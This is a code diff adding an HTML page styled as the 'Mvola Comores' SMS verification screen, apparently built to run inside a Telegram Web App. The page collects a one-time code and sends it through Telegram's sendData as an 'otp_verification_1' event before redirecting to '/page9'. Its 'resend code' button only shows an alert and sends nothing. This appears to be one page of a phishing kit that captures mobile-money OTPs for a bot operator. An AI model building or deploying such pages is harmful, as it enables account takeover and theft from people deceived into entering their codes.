@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mvola Comores - Vérification SMS</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --mvola-yellow: #ffcc00;
+            --mvola-yellow-dark: #e6b800;
+            --mvola-dark: #121820;
+            --bg-color: #ffffff;
+            --text-dark: #111111;
+            --text-muted: #666666;
+            --border-color: #e2e8f0;
+            --ring-track: #edf2f7;
+            --ring-active: #ffcc00;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: var(--mvola-yellow);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .back-btn-top {
+            color: var(--mvola-dark);
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            color: var(--mvola-dark);
+        }
+
+        .header-title .region {
+            color: var(--mvola-dark);
+            font-size: 12px;
+            margin-left: 6px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: rgba(0, 0, 0, 0.08);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        /* Main Container */
+        .container {
+            width: 90%;
+            max-width: 400px;
+            margin: 30px auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            flex-grow: 1;
+        }
+
+        .main-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin: 10px 0 16px;
+            letter-spacing: -0.5px;
+        }
+
+        .instruction-text {
+            font-size: 15px;
+            color: var(--text-muted);
+            margin: 0 0 10px;
+            line-height: 1.4;
+        }
+
+        .phone-highlight {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        /* Edit Phone Pill Button */
+        .btn-edit-phone {
+            background-color: #ffffff;
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 6px 16px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444444;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            margin-bottom: 35px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
+            text-decoration: none;
+        }
+
+        .btn-edit-phone:active {
+            background-color: #f7f7f7;
+        }
+
+        /* OTP Input Box */
+        .otp-input-container {
+            width: 100%;
+            margin-bottom: 35px;
+        }
+
+        .otp-input {
+            width: 100%;
+            padding: 16px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            text-align: center;
+            letter-spacing: 4px;
+            outline: none;
+            color: var(--text-dark);
+            background-color: #ffffff;
+            transition: border-color 0.2s;
+        }
+
+        .otp-input::placeholder {
+            color: #a0aec0;
+            letter-spacing: normal;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .otp-input:focus {
+            border-color: var(--mvola-yellow-dark);
+        }
+
+        /* Rotating Progress Circle Timer */
+        .timer-wrapper {
+            position: relative;
+            width: 180px;
+            height: 180px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+
+        .timer-svg {
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+        }
+
+        .timer-circle-bg {
+            fill: none;
+            stroke: var(--ring-track);
+            stroke-width: 8;
+        }
+
+        .timer-circle-progress {
+            fill: none;
+            stroke: var(--ring-active);
+            stroke-width: 8;
+            stroke-linecap: round;
+            stroke-dasharray: 440;
+            stroke-dashoffset: 0;
+            transition: stroke-dashoffset 1s linear;
+        }
+
+        .timer-text {
+            position: absolute;
+            font-size: 32px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        /* Expiration & Resend Section */
+        .expire-pill {
+            background-color: #ffffff;
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 8px 18px;
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .resend-link {
+            color: var(--mvola-dark);
+            font-weight: 800;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 15px;
+            display: none;
+        }
+
+        /* Verify Action Button */
+        .btn-verify {
+            background-color: var(--mvola-yellow);
+            color: var(--mvola-dark);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-top: 25px;
+            transition: background-color 0.2s, opacity 0.2s;
+            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.4);
+        }
+
+        .btn-verify:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Retour</a>
+    <div class="header-title">
+        <span>Mvola</span><span class="region">Comores</span>
+    </div>
+</div>
+
+<div class="container">
+    <h1 class="main-title">Vérification SMS</h1>
+
+    <p class="instruction-text">Veuillez entrer le code de validation envoyé par SMS au</p>
+    <div class="phone-highlight" id="userPhoneDisplay">+269 -- --- --</div>
+
+    <a onclick="goBack()" class="btn-edit-phone">
+        ✏️ Modifier le numéro
+    </a>
+
+    <form id="otpForm" style="width: 100%;" onsubmit="submitOtp(event)">
+        <div class="otp-input-container">
+            <input 
+                type="tel" 
+                id="otpCode" 
+                class="otp-input" 
+                placeholder="Entrer le code à usage unique" 
+                maxlength="6" 
+                pattern="[0-9]*" 
+                inputmode="numeric" 
+                required
+            >
+        </div>
+
+        <div class="timer-wrapper">
+            <svg class="timer-svg" viewBox="0 0 160 160">
+                <circle class="timer-circle-bg" cx="80" cy="80" r="70"></circle>
+                <circle id="progressCircle" class="timer-circle-progress" cx="80" cy="80" r="70"></circle>
+            </svg>
+            <div id="timerText" class="timer-text">02:00</div>
+        </div>
+
+        <div id="expireBadge" class="expire-pill">
+            Expire dans <span id="expireSeconds">120</span> sec
+        </div>
+
+        <div id="resendContainer" class="resend-link" onclick="resendCode()">
+            Vous n'avez pas reçu le code ? <u>Renvoyer le code</u>
+        </div>
+
+        <button type="submit" id="verifyBtn" class="btn-verify">VALIDER</button>
+    </form>
+</div>
+
+<script>
+    const TOTAL_TIME = 120; // 2 Minutes
+    let timeLeft = TOTAL_TIME;
+    let timerInterval = null;
+
+    const timerTextEl = document.getElementById('timerText');
+    const expireSecondsEl = document.getElementById('expireSeconds');
+    const progressCircle = document.getElementById('progressCircle');
+    const expireBadge = document.getElementById('expireBadge');
+    const resendContainer = document.getElementById('resendContainer');
+    const phoneDisplayEl = document.getElementById('userPhoneDisplay');
+
+    // SVG Circle perimeter for r=70: 2 * PI * 70 ≈ 440
+    const CIRCUMFERENCE = 440;
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Fetch stored phone number
+        const rawPhone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "3312345";
+        phoneDisplayEl.textContent = rawPhone.startsWith('+') ? rawPhone : `+269 ${rawPhone}`;
+
+        startTimer();
+    };
+
+    function startTimer() {
+        clearInterval(timerInterval);
+        timeLeft = TOTAL_TIME;
+        updateTimerDisplay();
+
+        resendContainer.style.display = 'none';
+        expireBadge.style.display = 'block';
+
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            updateTimerDisplay();
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                onTimerExpired();
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        
+        const formattedMinutes = String(minutes).padStart(2, '0');
+        const formattedSeconds = String(seconds).padStart(2, '0');
+        
+        timerTextEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
+        expireSecondsEl.textContent = timeLeft;
+
+        // Progress bar calculation
+        const strokeOffset = CIRCUMFERENCE - (timeLeft / TOTAL_TIME) * CIRCUMFERENCE;
+        progressCircle.style.strokeDashoffset = strokeOffset;
+    }
+
+    function onTimerExpired() {
+        timerTextEl.textContent = "00:00";
+        expireBadge.style.display = 'none';
+        resendContainer.style.display = 'block';
+    }
+
+    function resendCode() {
+        alert("Un nouveau code de validation a été envoyé par SMS.");
+        startTimer();
+    }
+
+    function submitOtp(event) {
+        event.preventDefault();
+        const codeVal = document.getElementById('otpCode').value.trim();
+
+        if (codeVal.length < 4) {
+            alert("Veuillez entrer un code de vérification valide.");
+            return;
+        }
+
+        // Store OTP code locally
+        localStorage.setItem('smsOtp1', codeVal);
+
+        // Send data to Telegram WebApp if present
+        const tg = window.Telegram?.WebApp;
+        if (tg && tg.sendData) {
+            tg.sendData(JSON.stringify({ event: "otp_verification_1", otp: codeVal }));
+        }
+
+        // Redirect to Page 9
+        window.location.href = "/page9";
+    }
+
+    function goBack() {
+        window.location.href = "/page6";
+    }
+</script>
+
+</body>
+</html>
